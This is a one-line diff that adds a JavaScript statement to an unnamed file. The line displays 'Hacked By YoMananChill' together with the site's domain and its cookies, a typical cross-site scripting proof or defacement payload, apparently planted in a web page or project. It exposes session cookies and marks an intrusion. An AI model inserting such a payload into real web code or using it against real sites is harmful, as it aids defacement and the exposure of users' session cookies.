@@ -1,0 +1,1 @@
+alert("Hacked By YoMananChill\n" + document.domain + "\n" + document.cookie);
